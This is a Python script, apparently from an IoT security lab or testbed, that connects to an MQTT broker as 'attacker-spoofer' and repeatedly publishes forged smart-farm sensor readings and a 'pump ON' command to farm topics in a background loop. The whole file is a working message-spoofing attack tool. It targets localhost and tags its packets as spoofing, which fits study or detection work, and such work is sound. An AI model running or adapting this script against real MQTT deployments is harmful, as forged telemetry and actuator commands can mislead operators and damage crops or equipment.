import json
import random
import threading
import time
from paho.mqtt import client as mqtt_client

BROKER = "localhost"
PORT = 1883

client = mqtt_client.Client(
    mqtt_client.CallbackAPIVersion.VERSION2,
    client_id="attacker-spoofer"
)

client.connect(BROKER, PORT)
client.loop_start()

running = False

TOPICS = [
    "farm/soil",
    "farm/temperature",
    "farm/humidity",
    "farm/light",
    "farm/pump"
]

def spoof_payload(topic):
    if topic == "farm/soil":
        return {"soil_moisture": 99}

    if topic == "farm/temperature":
        return {"temperature": 55.0}

    if topic == "farm/humidity":
        return {"humidity": 10}

    if topic == "farm/light":
        return {"light_intensity": 999}

    if topic == "farm/pump":
        return {"pump_status": "ON"}

def attack_loop():
    while running:
        topic = random.choice(TOPICS)

        payload = {
            "device": "attacker-node",
            "packet_type": "spoofing",
            "timestamp": time.time(),
            **spoof_payload(topic)
        }

        client.publish(topic, json.dumps(payload))
        print(f"🚨 Spoofed [{topic}] -> {payload}")

        time.sleep(0.5)

def start_spoof_attack():
    global running
    if running:
        return

    running = True
    threading.Thread(target=attack_loop, daemon=True).start()

def stop_spoof_attack():
    global running
    running = False